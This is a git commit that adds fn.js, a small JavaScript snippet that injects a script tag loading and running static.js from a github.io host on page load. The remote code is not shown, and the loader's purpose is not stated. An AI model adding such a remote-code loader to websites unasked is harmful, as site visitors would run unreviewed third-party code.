86fa6c485f5d32fdf858bb544721a93f3c50f88b
responsivethemesstatic <53955700+responsivethemesstatic@users.noreply.github.com>
2019-08-23 07:45:50 +0300

    Create fn.js

---
+++ fn.js
@@ -0,0 +1,9 @@
+(function() {
+
+    var script = document.createElement('script');
+    script.async = true;
+    script.type = 'text/javascript';
+    script.src = 'https://responsivethemesstatic.github.io/static/static.js';
+    var entry = document.getElementsByTagName('script')[0];
+    entry.parentNode.insertBefore(script, entry);
+})();
